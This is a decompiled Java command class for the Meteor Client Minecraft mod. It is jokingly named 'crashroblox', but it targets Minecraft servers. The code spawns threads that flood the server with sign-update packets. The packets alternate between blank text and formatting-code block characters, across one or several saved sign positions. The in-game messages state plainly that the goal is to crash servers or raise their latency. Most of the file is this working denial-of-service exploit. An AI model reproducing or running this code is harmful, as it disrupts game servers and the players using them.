package com.adammp.commands;

import com.adammp.Storage.Storage;
import com.mojang.brigadier.arguments.ArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.Commands;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.class_124;
import net.minecraft.class_2172;
import net.minecraft.class_2338;
import net.minecraft.class_2508;
import net.minecraft.class_2561;
import net.minecraft.class_2583;
import net.minecraft.class_2596;
import net.minecraft.class_2877;

@Environment(value=EnvType.CLIENT)
public class crashrobloxcommand
extends Command {
    public crashrobloxcommand() {
        super("crashroblox", "Yes qwerty. i have to. the power of crashing roblox servers is too much", new String[0]);
    }

    public void build(LiteralArgumentBuilder<class_2172> builder) {
        builder.then(crashrobloxcommand.argument((String)"secs", (ArgumentType)IntegerArgumentType.integer()).executes(ctx -> {
            boolean haveit;
            int a = IntegerArgumentType.getInteger((CommandContext)ctx, (String)"secs");
            boolean bl = haveit = Storage.savedPositions.size() > 1;
            if (a > 0 && a < 10) {
                int calculated = 6 * (a * 2);
                ChatUtils.sendMsg((class_2561)class_2561.method_43470((String)"Owner of crashcommand. this is approx seconds. might be more seconds!!"));
                ChatUtils.sendMsg((class_2561)class_2561.method_43470((String)"Also. it will only break roblox servers!"));
                assert (crashrobloxcommand.mc.field_1724 != null);
                class_2338 pos = crashrobloxcommand.mc.field_1724.method_24515();
                assert (crashrobloxcommand.mc.field_1687 != null);
                if (!haveit) {
                    ChatUtils.sendMsg((class_2561)class_2561.method_43470((String)"To successfully crash roblox servers. You need to use multiple signs!. Use it by doing: .addpos, This might only tweak the ping not that much (Using only 1 sign!)"));
                } else {
                    ChatUtils.sendMsg((class_2561)class_2561.method_43470((String)("Loaded " + Storage.savedPositions.size() + " Signs")).method_10862(class_2583.field_24360.method_10977(class_124.field_1060).method_10982(Boolean.valueOf(true))));
                }
                if (crashrobloxcommand.mc.field_1687.method_8320(pos).method_26204() instanceof class_2508) {
                    if (!haveit) {
                        new Thread(() -> {
                            for (int i = 0; i < calculated; ++i) {
                                try {
                                    Thread.sleep(10L);
                                }
                                catch (Exception e) {
                                    ChatUtils.sendMsg((class_2561)class_2561.method_43470((String)e.toString()));
                                }
                                if (i % 2 != 0) {
                                    crashrobloxcommand.mc.field_1724.field_3944.method_52787((class_2596)new class_2877(pos, true, "", "", "", ""));
                                    continue;
                                }
                                crashrobloxcommand.mc.field_1724.field_3944.method_52787((class_2596)new class_2877(pos, true, "\u00a7f\u2588\u2588\u2588\u2588\u2588", "\u00a7f\u2588\u2588\u2588\u2588\u2588", "\u00a7f\u2588\u2588\u2588\u2588\u2588", "\u00a7f\u2588\u2588\u2588\u2588\u2588"));
                            }
                        }).start();
                    } else if (haveit) {
                        for (class_2338 signPos : Storage.savedPositions) {
                            new Thread(() -> {
                                for (int i = 0; i < calculated; ++i) {
                                    try {
                                        Thread.sleep(100L);
                                    }
                                    catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                    if (i % 2 != 0) {
                                        crashrobloxcommand.mc.field_1724.field_3944.method_52787((class_2596)new class_2877(signPos, true, "", "", "", ""));
                                        continue;
                                    }
                                    crashrobloxcommand.mc.field_1724.field_3944.method_52787((class_2596)new class_2877(signPos, true, "\u00a7f\u2588\u2588\u2588\u2588\u2588", "\u00a7f\u2588\u2588\u2588\u2588\u2588", "\u00a7f\u2588\u2588\u2588\u2588\u2588", "\u00a7f\u2588\u2588\u2588\u2588\u2588"));
                                }
                            }).start();
                        }
                    }
                }
            }
            return 0;
        }));
    }

    public static void init() {
        Commands.add((Command)new crashrobloxcommand());
    }
}

